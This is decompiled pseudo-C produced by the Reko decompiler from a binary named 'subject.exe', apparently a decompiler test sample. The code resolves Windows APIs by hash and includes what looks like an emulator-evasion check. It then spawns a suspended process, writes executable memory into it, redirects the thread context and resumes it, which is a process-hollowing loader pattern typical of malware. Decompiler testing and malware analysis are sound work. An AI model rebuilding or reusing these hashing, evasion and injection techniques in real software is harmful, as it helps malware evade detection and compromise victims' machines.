// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register word32 fn00401000(Stack Eq_3 dwArg04, Stack uint32 dwArg08)
word32 fn00401000(HMODULE dwArg04, uint32 dwArg08)
{
	word32 eax_26 = Mem0[Mem0[dwArg04 + 0x3C:word32] + dwArg04 + 0x78:word32] + dwArg04;
	word16 eax_29[] = dwArg04 + eax_26->dw0024 / 0x0040;
	uint32 esi_134 = dwArg08;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		esi_134 = dwArg08 + 550842;
	word32 eax_46[] = dwArg04 + eax_26->dw0020 / 0x0040;
	word32 eax_49[] = dwArg04 + eax_26->dw001C / 0x0040;
	int32 edx_116 = 0x00;
	while (true)
	{
		word32 eax_114;
		if (edx_116 >= eax_26->dw0018)
			break;
		Eq_67 (* eax_90)[] = dwArg04 + eax_46[edx_116] / 0x0040;
		dwLoc14 = dwLoc14 & 0x00;
		dwLoc18 = dwLoc18 & 0x00;
		while (Mem0[dwLoc14 + eax_90:byte] != 0x00)
		{
			dwLoc18 = (int32) Mem0[dwLoc14 + eax_90:byte] ^ 0x47 ^ (dwLoc18 << 0x07 | dwLoc18 >>u 0x19);
			dwLoc14 = dwLoc14 + 0x01;
		}
		if (dwLoc18 == esi_134)
		{
			eax_114 = dwArg04 + eax_49[(word32) eax_29[edx_116]] / 0x0040;
			return eax_114;
		}
		edx_116 = edx_116 + 0x01;
	}
	eax_114 = 0x00;
	return eax_114;
}

// 0040130C: void fn0040130C(Register word32 ebp)
void fn0040130C(word32 ebp)
{
	lstrcpyA(fp - 0x24, globals->t403010);
	Eq_3 eax_22 = LoadLibraryA(fp - 0x24);
	Eq_3 ebx_24 = eax_22;
	if (eax_22 == null)
	{
		lstrcatA(fp - 0x24, globals->t40302C);
		LoadLibraryA(fp - 0x24);
		lstrcatA(fp - 0x24, globals->t403020);
		ebx_24 = LoadLibraryA(fp - 0x24);
	}
	globals->ptr4037A8 = fn00401000(ebx_24, 3308750557);
	globals->ptr4037AC = fn00401000(ebx_24, 0x19B9B4BC);
	globals->ptr4037B0 = fn00401000(ebx_24, 509688883);
	globals->ptr4037B4 = fn00401000(ebx_24, 689660713);
	globals->ptr4037B8 = fn00401000(ebx_24, 689654569);
	globals->ptr4037BC = fn00401000(ebx_24, 3305026339);
	globals->ptr4037C0 = fn00401000(ebx_24, 3875476678);
	globals->ptr4037C4 = fn00401000(ebx_24, 0x2AEEC701);
	globals->ptr403194 = fn00401000(ebx_24, 2010811454);
	globals->ptr403190 = fn00401000(ebx_24, 1423919133);
	globals->ptr40318C = fn00401000(ebx_24, 1423642269);
	globals->ptr4037C8 = fn00401000(ebx_24, 0x553E451D);
	globals->ptr40319C = fn00401000(ebx_24, 1164480822);
	globals->ptr403198 = fn00401000(ebx_24, 885916858);
	globals->ptr4031A0 = fn00401000(ebx_24, 1049500871);
	globals->ptr4037CC = fn00401000(ebx_24, 3079019788);
	globals->ptr4037D0 = fn00401000(ebx_24, 809577528);
	globals->ptr4037D4 = fn00401000(ebx_24, 3443547341);
	ptr32 esp_161;
	word32 ebp_162;
	byte SCZO_163;
	word32 ebx_164;
	word32 eax_165;
	byte SZO_166;
	bool C_167;
	bool Z_168;
	globals->ptr40318C();
	*(esp_161 - 0x04) = globals->dw403054;
	*(esp_161 - 0x08) = fp - 0x24;
	ptr32 esp_175;
	word32 ebp_176;
	byte SCZO_177;
	word32 ebx_178;
	word32 eax_179;
	byte SZO_180;
	bool C_181;
	bool Z_182;
	globals->ptr403190();
	*(esp_175 - 0x04) = globals->dw403050;
	*(esp_175 - 0x08) = fp - 0x24;
	ptr32 esp_189;
	word32 ebp_190;
	byte SCZO_191;
	word32 ebx_192;
	word32 eax_193;
	byte SZO_194;
	bool C_195;
	bool Z_196;
	globals->ptr403190();
	*(esp_189 - 0x04) = globals->dw40300C;
	*(esp_189 - 0x08) = fp - 0x24;
	ptr32 esp_203;
	word32 ebp_204;
	byte SCZO_205;
	word32 ebx_206;
	word32 eax_207;
	byte SZO_208;
	bool C_209;
	bool Z_210;
	globals->ptr403190();
	*(esp_203 - 0x04) = fp - 0x24;
	ptr32 esp_214;
	word32 ebp_215;
	byte SCZO_216;
	word32 ebx_217;
	word32 eax_218;
	byte SZO_219;
	bool C_220;
	bool Z_221;
	globals->ptr403194();
	*(esp_214 - 0x04) = 0x1419255C;
	*(esp_214 - 0x08) = eax_218;
	globals->ptr4037D8 = fn00401000(dwArg00, dwArg04);
	*(esp_214 - 0x04) = 3009360335;
	*(esp_214 - 0x08) = eax_218;
	globals->ptr4037DC = fn00401000(dwArg00, dwArg04);
	*(esp_214 - 0x04) = 0x3B7B3E60;
	*(esp_214 - 0x08) = eax_218;
	globals->ptr4037E0 = fn00401000(dwArg00, dwArg04);
	*(esp_214 - 0x04) = 2569513572;
	*(esp_214 - 0x08) = eax_218;
	globals->ptr4037E4 = fn00401000(dwArg00, dwArg04);
	*(esp_214 - 0x04) = 332757019;
	*(esp_214 - 0x08) = eax_218;
	<anonymous> * eax_257 = fn00401000(dwArg00, dwArg04);
	globals->ptr4037E8 = eax_257;
	*(esp_214 - 0x04) = globals->dw403000;
	ptr32 esp_263;
	word32 ebp_264;
	byte SCZO_265;
	word32 ebx_266;
	word32 eax_267;
	byte SZO_268;
	bool C_269;
	bool Z_270;
	globals->ptr403194();
	*(esp_263 - 0x04) = 0xEC0DC481;
	*(esp_263 - 0x08) = eax_267;
	<anonymous> * eax_276 = fn00401000(dwArg00, dwArg04);
	globals->ptr4037EC = eax_276;
	fn0040172A();
	*(esp_263 - 0x04) = 0x00;
	word32 esp_281;
	word32 ebp_282;
	byte SCZO_283;
	word32 ebx_284;
	word32 eax_285;
	byte SZO_286;
	bool C_287;
	bool Z_288;
	globals->ptr4037C4();
}

// 0040172A: void fn0040172A()
void fn0040172A()
{
	Eq_454 eax_21 = GetModuleFileNameA(null, &globals->t4038F4, 0x0104);
	ptr32 esp_29;
	word32 ebp_30;
	word32 eax_31;
	word32 ebx_32;
	word32 esi_33;
	word32 edx_34;
	byte SCZO_35;
	globals->ptr40318C();
	*(esp_29 - 0x04) = globals->dw403004;
	*(esp_29 - 0x08) = 0x004037F0;
	ptr32 esp_41;
	word32 ebp_42;
	word32 eax_43;
	word32 ebx_44;
	word32 esi_45;
	word32 edx_46;
	byte SCZO_47;
	globals->ptr403190();
	*(esp_41 - 0x04) = globals->dw403044;
	*(esp_41 - 0x08) = 0x004037F0;
	ptr32 esp_53;
	word32 ebp_54;
	word32 eax_55;
	word32 ebx_56;
	word32 esi_57;
	word32 edx_58;
	byte SCZO_59;
	globals->ptr403190();
	*(esp_53 - 0x04) = globals->dw403048;
	*(esp_53 - 0x08) = 0x004037F0;
	ptr32 esp_65;
	word32 ebp_66;
	word32 eax_67;
	word32 ebx_68;
	word32 esi_69;
	word32 edx_70;
	byte SCZO_71;
	globals->ptr403190();
	*(esp_65 - 0x04) = 4208884;
	*(esp_65 - 0x08) = 0x004037F0;
	ptr32 esp_76;
	word32 ebp_77;
	word32 eax_78;
	word32 ebx_79;
	word32 esi_80;
	word32 edx_81;
	byte SCZO_82;
	globals->ptr403190();
	globals->dw4039F8 = 0x44;
	globals->dw403A24 = 0x01;
	globals->w403A28 = 0x02;
	*(esp_76 - 0x04) = 4209212;
	*(esp_76 - 0x08) = 4209144;
	*(esp_76 - 0x0C) = 0x00;
	*(esp_76 - 0x10) = 0x00;
	*(esp_76 - 0x14) = 0x04;
	*(esp_76 - 0x18) = 0x00;
	*(esp_76 - 0x1C) = 0x00;
	*(esp_76 - 0x20) = 0x00;
	*(esp_76 - 0x24) = 0x004037F0;
	*(esp_76 - 0x28) = 0x00;
	ptr32 esp_106;
	word32 ebp_107;
	word32 eax_108;
	word32 ebx_109;
	word32 esi_110;
	word32 edx_111;
	byte SCZO_112;
	globals->ptr4037A8();
	*(esp_106 - 0x04) = 0x00;
	Eq_3 eax_115 = GetModuleHandleA(*(esp_106 - 0x04));
	Eq_653 edx_118 = eax_115->t003C;
	*(esp_106 - 0x04) = 0x40;
	*(esp_106 - 0x08) = 0x3000;
	word32 eax_119 = eax_115 + edx_118;
	*(esp_106 - 0x0C) = eax_119->dw0050;
	*(esp_106 - 0x10) = (HMODULE *) eax_115;
	*(esp_106 - 0x14) = globals->dw403A3C;
	ptr32 esp_134;
	word32 ebp_135;
	word32 eax_136;
	word32 ebx_137;
	struct Eq_695 * esi_138;
	word32 edx_139;
	byte SCZO_140;
	globals->ptr4037AC();
	*(esp_134 - 0x04) = fp - 0x08;
	*(esp_134 - 0x08) = esi_138->dw0050;
	*(esp_134 - 0x0C) = ebx_137;
	*(esp_134 - 0x10) = eax_136;
	*(esp_134 - 0x14) = globals->dw403A3C;
	ptr32 esp_154;
	word32 ebp_155;
	word32 eax_156;
	word32 ebx_157;
	word32 esi_158;
	word32 edx_159;
	byte SCZO_160;
	globals->ptr4037B0();
	globals->dw403A4C = 0x00010007;
	*(esp_154 - 0x04) = 4209228;
	*(esp_154 - 0x08) = globals->dw403A40;
	ptr32 esp_167;
	word32 ebp_168;
	word32 eax_169;
	word32 ebx_170;
	word32 esi_171;
	word32 edx_172;
	byte SCZO_173;
	globals->ptr4037B4();
	globals->dw403B04 = 0x004010C4;
	*(esp_167 - 0x04) = 4209228;
	*(esp_167 - 0x08) = globals->dw403A40;
	ptr32 esp_181;
	word32 ebp_182;
	word32 eax_183;
	word32 ebx_184;
	word32 esi_185;
	word32 edx_186;
	byte SCZO_187;
	globals->ptr4037B8();
	*(esp_181 - 0x04) = globals->dw403A40;
	word32 esp_191;
	word32 ebp_192;
	word32 eax_193;
	word32 ebx_194;
	word32 esi_195;
	word32 edx_196;
	byte SCZO_197;
	globals->ptr4037BC();
}

